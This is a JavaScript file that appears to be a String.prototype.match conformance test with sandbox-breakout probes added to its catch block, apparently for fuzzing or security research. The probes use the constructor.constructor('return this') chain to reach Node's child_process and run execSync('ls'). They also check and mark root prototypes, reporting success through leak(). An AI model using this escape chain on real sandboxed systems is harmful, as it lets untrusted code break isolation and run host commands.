try {
    var __string = '1234567890';
    if (__string.match(3)[0] !== '3') {
        $ERROR('#1: __string = "1234567890"; __string.match(3)[0]=== "3". Actual: ' + __string.match(3)[0]);
    }
    if (__string.match(3).length !== 1) {
        $ERROR('#2: __string = "1234567890"; __string.match(3).length ===1. Actual: ' + __string.match(3).length);
    }
    if (__string.match(3).index !== 2) {
        $ERROR('#3: __string = "1234567890"; __string.match(3).index ===2. Actual: ' + __string.match(3).index);
    }
    if (__string.match(3).input !== __string) {
        $ERROR('#4: __string = "1234567890"; __string.match(3).input ===__string. Actual: ' + __string.match(3).input);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}